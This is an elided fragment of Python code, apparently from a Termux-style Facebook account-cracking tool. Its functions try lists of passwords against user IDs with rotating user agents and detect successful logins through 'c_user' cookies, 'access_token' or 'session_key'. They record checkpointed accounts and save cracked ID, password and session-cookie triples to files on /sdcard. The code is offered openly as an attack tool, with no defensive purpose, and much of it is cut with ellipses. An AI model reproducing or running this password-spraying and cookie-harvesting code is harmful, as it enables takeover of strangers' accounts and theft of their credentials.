		...
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|lipu-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/lipu-RANDM-M1-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|lipu-CP|> {idf} ● {pw} ")
				open('/sdcard/lipu-RANDN-M1-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
...
def ____M2____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|lipu-M2|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
		...
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|lipu-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/lipu-RANDM-M5-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|lipu-CP|> {idf} ● {pw} ")
				open('/sdcard/LIPU-RANDN-M5-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
		...
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|LIPU-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/LIPU-RANDM-M6-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|LIPU-CP|> {idf} ● {pw} ")
				open('/sdcard/LIPU-RANDN-M6-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|LIPU-XD|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|LIPU-CP|> {uid} ● {ps}")
				open("/sdcard/LIPU-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			elif "session_key" in po:
				print(f"\r\r{green}<|LIPU-OK|> {uid} ● {ps}")
				open("/sdcard/LIPU-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			else:pass
		loop+=1
